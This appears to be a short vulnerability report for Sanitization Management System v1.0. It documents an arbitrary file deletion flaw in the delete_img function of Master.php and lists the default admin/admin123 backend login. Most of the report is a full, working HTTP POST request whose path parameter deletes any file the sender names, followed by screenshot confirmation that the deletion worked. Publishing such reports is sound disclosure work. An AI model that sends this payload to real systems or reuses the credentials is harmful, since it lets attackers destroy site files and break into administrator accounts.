# Sanitization Management System v1.0 by oretnom23 has Delete any file

BUG_Author: Hujozay

vendors: https://www.sourcecodester.com/php/15770/sanitization-management-system-project-php-and-mysql-free-source-code.html

Vulnerability File: /php-sms/classes/Master.php?f=delete_img

Vulnerability location: /php-sms/classes/Master.php?f=delete_img, path

The password for the backend login account is: admin/admin123

Payload:

Here we delete the shel.php file in the root directory

```sql
POST /php-sms/classes/Master.php?f=delete_img HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.88/php-sms/admin/?page=system_info
Content-Length: 71
Cookie: PHPSESSID=3puonr8mf2gr4m6iivf71mhjtq
Connection: close

path=C%3A%2Fxampp%2Fhtdocs%2Fphp-sms%2Fuploads%2Fbanner%2Fshell.php
```

At present, the shell.php file is still in the  directory of the website, when we send a request to delete the shell.php file

![image](https://user-images.githubusercontent.com/54017627/195979959-5acffb58-39e5-4168-819c-9071cae37441.png)

The response package shows that the deletion was successful. Let's go to the directory to see if the shell.php file still exists.
![image](https://user-images.githubusercontent.com/54017627/195979975-7af185cd-9cb9-4b65-843e-69c7ebaa1bfc.png)

By this time, shell.php has been deleted.
![image](https://user-images.githubusercontent.com/54017627/195979989-1d10bb96-44ab-45e9-8244-95ac81b987da.png)

